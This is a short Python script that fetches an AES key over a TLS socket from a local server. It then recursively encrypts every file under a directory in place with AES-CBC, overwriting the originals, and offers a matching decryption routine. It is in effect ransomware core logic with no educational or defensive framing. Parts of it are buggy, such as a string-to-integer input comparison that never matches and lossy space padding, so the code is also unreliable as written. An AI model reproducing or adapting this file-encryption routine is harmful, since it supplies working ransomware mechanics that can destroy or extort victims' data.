import os
import socket
import ssl
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def encrypt_plaintext(plaintext, random_key):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(random_key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    plain_text_padded = plaintext + (b' ' * (16 - (len(plaintext) % 16)))
    cipher_text = encryptor.update(plain_text_padded) + encryptor.finalize()
    return iv + cipher_text

def encrypt_file(path, random_key):
    with open(path, "rb+") as file:
        plaintext = file.read()
        encrypted_plaintext = encrypt_plaintext(plaintext, random_key)
        file.seek(0)
        file.write(encrypted_plaintext)
        file.truncate()

def iterate_path(path, random_key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, random_key)

def decrypt_ciphertext(cipher_text, random_key):
    iv = cipher_text[:16]
    cipher_text = cipher_text[16:]
    cipher = Cipher(algorithms.AES(random_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    plain_text_padded = decryptor.update(cipher_text) + decryptor.finalize()
    plain_text = plain_text_padded.rstrip(b' ')
    return plain_text

def decrypt_file(path, random_key):
    with open(path, "rb+") as file:
        cipher_text = file.read()
        decrypted_plaintext = decrypt_ciphertext(cipher_text, random_key)
        file.seek(0)
        file.write(decrypted_plaintext)
        file.truncate()

def iterate_decryption_path(path, random_key):
    for root, dirs, files in os.walk(path):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, random_key)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ssl_socket = ssl.wrap_socket(s)
ssl_socket.connect(("127.0.0.1", 8080))
random_key = ssl_socket.recv(1024)
d = input("Enter 1 if you want to encrypt and 2 if you want to decrypt")
if d == 1:
    iterate_path("/path/to/some/path", random_key)
elif d == 2:
    iterate_decryption_path("/path/to/some/path", random_key)
else: print("wrong input")
